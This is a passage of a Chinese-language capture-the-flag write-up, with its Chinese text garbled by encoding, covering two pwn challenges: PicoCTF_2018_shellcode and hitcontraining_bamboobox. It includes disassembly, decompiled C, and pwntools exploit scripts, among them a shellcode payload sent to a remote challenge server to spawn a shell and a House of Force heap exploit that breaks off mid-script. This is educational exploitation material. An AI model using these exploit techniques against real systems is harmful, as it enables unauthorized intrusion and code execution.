class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">.text:080488A1 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:080488A1                 public main</span><br><span class="line">.text:080488A1 main            proc near               ; DATA XREF: _start+17â†‘o</span><br><span class="line">.text:080488A1</span><br><span class="line">.text:080488A1 var_A0          = byte ptr -0A0h</span><br><span class="line">.text:080488A1 var_C           = dword ptr -0Ch</span><br><span class="line">.text:080488A1 var_4           = dword ptr -4</span><br><span class="line">.text:080488A1 argc            = dword ptr  8</span><br><span class="line">.text:080488A1 argv            = dword ptr  0Ch</span><br><span class="line">.text:080488A1 envp            = dword ptr  10h</span><br><span class="line">.text:080488A1</span><br><span class="line">.text:080488A1 ; __unwind &#123;</span><br><span class="line">.text:080488A1                 lea     ecx, [esp+4]</span><br><span class="line">.text:080488A5                 and     esp, 0FFFFFFF0h</span><br><span class="line">.text:080488A8                 push    dword ptr [ecx-4]</span><br><span class="line">.text:080488AB                 push    ebp</span><br><span class="line">.text:080488AC                 mov     ebp, esp</span><br><span class="line">.text:080488AE                 push    ecx</span><br><span class="line">.text:080488AF                 sub     esp, 0A4h</span><br><span class="line">.text:080488B5                 mov     eax, stdout</span><br><span class="line">.text:080488BA                 push    0</span><br><span class="line">.text:080488BC                 push    2</span><br><span class="line">.text:080488BE                 push    0</span><br><span class="line">.text:080488C0                 push    eax</span><br><span class="line">.text:080488C1                 call    setvbuf</span><br><span class="line">.text:080488C6                 add     esp, 10h</span><br><span class="line">.text:080488C9                 call    getegid</span><br><span class="line">.text:080488CE                 mov     [ebp+var_C], eax</span><br><span class="line">.text:080488D1                 sub     esp, 4</span><br><span class="line">.text:080488D4                 push    [ebp+var_C]</span><br><span class="line">.text:080488D7                 push    [ebp+var_C]</span><br><span class="line">.text:080488DA                 push    [ebp+var_C]</span><br><span class="line">.text:080488DD                 call    setresgid</span><br><span class="line">.text:080488E2                 add     esp, 10h</span><br><span class="line">.text:080488E5                 sub     esp, 0Ch</span><br><span class="line">.text:080488E8                 push    offset aEnterAString ; &quot;Enter a string!&quot;</span><br><span class="line">.text:080488ED                 call    puts</span><br><span class="line">.text:080488F2                 add     esp, 10h</span><br><span class="line">.text:080488F5                 sub     esp, 0Ch</span><br><span class="line">.text:080488F8                 lea     eax, [ebp+var_A0]</span><br><span class="line">.text:080488FE                 push    eax</span><br><span class="line">.text:080488FF                 call    vuln</span><br><span class="line">.text:08048904                 add     esp, 10h</span><br><span class="line">.text:08048907                 sub     esp, 0Ch</span><br><span class="line">.text:0804890A                 push    offset aThanksExecutin ; &quot;Thanks! Executing now...&quot;</span><br><span class="line">.text:0804890F                 call    puts</span><br><span class="line">.text:08048914                 add     esp, 10h</span><br><span class="line">.text:08048917                 lea     eax, [ebp+var_A0]</span><br><span class="line">.text:0804891D                 call    eax &lt;==è¿™é‡Œæœ‰é—®é¢˜</span><br><span class="line">.text:0804891F                 mov     eax, 0</span><br><span class="line">.text:08048924                 mov     ecx, [ebp+var_4]</span><br><span class="line">.text:08048927                 leave</span><br><span class="line">.text:08048928                 lea     esp, [ecx-4]</span><br><span class="line">.text:0804892B                 retn</span><br><span class="line">.text:0804892B ; &#125; // starts at 80488A1</span><br><span class="line">.text:0804892B main            endp</span><br></pre></td></tr></table></figure><p>å¯ä»¥çŸ¥é“ä¸€ä¸ªæ˜¯vulné‚£é‡Œï¼Œè¿˜æœ‰ä¸€ä¸ªæ˜¯call eaxé‚£é‡Œæœ‰ç‚¹å¯ç–‘ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.text:0804887C                 public vuln</span><br><span class="line">.text:0804887C vuln            proc near               ; CODE XREF: main+5Eâ†“p</span><br><span class="line">.text:0804887C</span><br><span class="line">.text:0804887C arg_0           = dword ptr  8</span><br><span class="line">.text:0804887C</span><br><span class="line">.text:0804887C ; __unwind &#123;</span><br><span class="line">.text:0804887C                 push    ebp</span><br><span class="line">.text:0804887D                 mov     ebp, esp</span><br><span class="line">.text:0804887F                 sub     esp, 8</span><br><span class="line">.text:08048882                 sub     esp, 0Ch</span><br><span class="line">.text:08048885                 push    [ebp+arg_0]</span><br><span class="line">.text:08048888                 call    gets</span><br><span class="line">.text:0804888D                 add     esp, 10h</span><br><span class="line">.text:08048890                 sub     esp, 0Ch</span><br><span class="line">.text:08048893                 push    [ebp+arg_0]</span><br><span class="line">.text:08048896                 call    puts</span><br><span class="line">.text:0804889B                 add     esp, 10h</span><br><span class="line">.text:0804889E                 nop</span><br><span class="line">.text:0804889F                 leave</span><br><span class="line">.text:080488A0                 retn</span><br><span class="line">.text:080488A0 ; &#125; // starts at 804887C</span><br><span class="line">.text:080488A0 vuln            endp</span><br></pre></td></tr></table></figure><p>è°ƒç”¨vulnçš„æ—¶å€™è¯¾çœ‹å‡ºæ¥æ˜¯åªæœ‰ä¸€ä¸ªå‚æ•°<code>var_A0</code>ï¼Œvulnä¸­è°ƒç”¨getsåå†™å…¥åˆ°<code>var_A0</code>ä¸­ï¼Œä¹‹åç›´æ¥call<code>var_A0</code>çš„åœ°å€ï¼Œsoï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&quot;debug&quot;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment"># io = process(&quot;./PicoCTF_2018_shellcode&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27093</span>)</span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x44-hitcontraining-bamboobox"><a href="#0x44-hitcontraining-bamboobox" class="headerlink" title="0x44.hitcontraining_bamboobox"></a>0x44.hitcontraining_bamboobox</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/Desktop$ checksec bamboobox </span><br><span class="line">[*] &#x27;/home/gwt/Desktop/bamboobox&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>mainï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> (**v4)(<span class="keyword">void</span>); <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  v4 = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">  *v4 = hello_message;</span><br><span class="line">  v4[<span class="number">1</span>] = goodbye_message;</span><br><span class="line">  (*v4)();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( atoi(buf) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        show_item();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        add_item();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        change_item();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        remove_item();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        v4[<span class="number">1</span>]();</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;invaild choice!!!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>show_itemï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">show_item</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !num )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;No item in the box&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">99</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(&amp;malloc_addr + <span class="number">2</span> * i) )</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d : %s&quot;</span>, i, *(&amp;malloc_addr + <span class="number">2</span> * i));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(byte_401089);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>addï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">add_item</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( num &gt; <span class="number">99</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;the box is full&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please enter the length of item name:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">    size = atoi(buf);</span><br><span class="line">    <span class="keyword">if</span> ( !size )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;invaild length&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">99</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !(&amp;malloc_addr)[<span class="number">2</span> * i] )</span><br><span class="line">      &#123;</span><br><span class="line">        *(&amp;malloc_size + <span class="number">4</span> * i) = size;</span><br><span class="line">        (&amp;malloc_addr)[<span class="number">2</span> * i] = <span class="built_in">malloc</span>(size);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Please enter the name of item:&quot;</span>);</span><br><span class="line">        *((&amp;malloc_addr)[<span class="number">2</span> * i] + read(<span class="number">0</span>, (&amp;malloc_addr)[<span class="number">2</span> * i], size)) = <span class="number">0</span>;</span><br><span class="line">        ++num;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">change_item</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> index; <span class="comment">// [rsp+4h] [rbp-2Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> nptr[<span class="number">8</span>]; <span class="comment">// [rsp+20h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( num )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please enter the index of item:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">    index = atoi(buf);</span><br><span class="line">    <span class="keyword">if</span> ( (&amp;malloc_addr)[<span class="number">2</span> * index] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Please enter the length of item name:&quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, nptr, <span class="number">8uLL</span>);</span><br><span class="line">      v2 = atoi(nptr);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Please enter the new name of the item:&quot;</span>);</span><br><span class="line">      *((&amp;malloc_addr)[<span class="number">2</span> * index] + read(<span class="number">0</span>, (&amp;malloc_addr)[<span class="number">2</span> * index], v2)) = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;invaild index&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No item in the box&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>removeï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">remove_item</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( num )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please enter the index of item:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">    v1 = atoi(buf);</span><br><span class="line">    <span class="keyword">if</span> ( (&amp;malloc_addr)[<span class="number">2</span> * v1] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>((&amp;malloc_addr)[<span class="number">2</span> * v1]);</span><br><span class="line">      (&amp;malloc_addr)[<span class="number">2</span> * v1] = <span class="number">0LL</span>;</span><br><span class="line">      *(&amp;malloc_size + <span class="number">4</span> * v1) = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;remove successful!!&quot;</span>);</span><br><span class="line">      --num;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;invaild index&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No item in the box&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰ä¸ªmagicï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __noreturn <span class="title">magic</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [rsp+Ch] [rbp-74h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">104</span>]; <span class="comment">// [rsp+10h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fd = open(<span class="string">&quot;/home/bamboobox/flag&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  read(fd, buf, <span class="number">0x64</span>uLL);</span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ‰ä¸¤ç§è§£æ³•ï¼š1.House Of Forceï¼Œ2.unlink</p><h2 id="1-House-Of-Force"><a href="#1-House-Of-Force" class="headerlink" title="1.House Of Force"></a>1.House Of Force</h2><p>éœ€è¦æ»¡è¶³ä¸¤ç‚¹</p><ol><li> èƒ½å¤Ÿä»¥æº¢å‡ºç­‰æ–¹å¼æ§åˆ¶åˆ° top chunk çš„ size åŸŸ</li><li> èƒ½å¤Ÿè‡ªç”±åœ°æ§åˆ¶å †åˆ†é…å°ºå¯¸çš„å¤§å°</li></ol><blockquote><p>  å¾€ä½åœ°å€å°±æ˜¯ä¸¤è€…(low_addr-0x10)-top_addr</p><p>  å¾€é«˜åœ°å€ï¼Œå°±æ˜¯(high_addr-0x10-top_addr)-0x10</p></blockquote><p>ç¨‹åºä¸­çš„changeå¹¶æ²¡æœ‰å¯¹è¾“å…¥çš„é•¿åº¦è¿›è¡Œé™åˆ¶</p><p>åˆ©ç”¨House Of Forceè¦†å†™ç¨‹åºä¸€å¼€å§‹mallocæ—¶å†™å…¥çš„goodbye_message</p><p>è¿œç¨‹æ²¡æœ‰<code>/home/bamboobox/flag</code>è¿™ä¸ªæ–‡ä»¶å¤¹ï¼Œæœ¬åœ°å¯ä»¥é€šï¼š</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&quot;./bamboobox&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./bamboobox&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span>(<span class="params">length,context</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Please enter the length of item name:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Please enter the name of item:&quot;</span>)</span><br><span class="line">    r.send(context)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,length,context</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Please enter the index of item:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Please enter the length of item name:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Please enter the new name of the item:&quot;</span>)</span><br><span class="line">    r.send(context)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Please enter the index of item:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span>():</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x30</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x40</span>,payload)</span><br><span class="line"></span><br><span class="line">magic=elf.sym[<span class="string">&#x27;magic&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;magic_addr:0x%x&quot;</span>,magic)</span><br><span class="line"></span><br><span class="line"><span class="comment"># malloc_size = -(0x40 + 0x20)-0x10</span></span><br><span class="line">malloc_size = <span class="number">0x1b22000</span> - <span class="number">0x10</span> -<span class="number">0x1b22060</span></span><br><span class="line">gdb.attach(r)</span><br><span 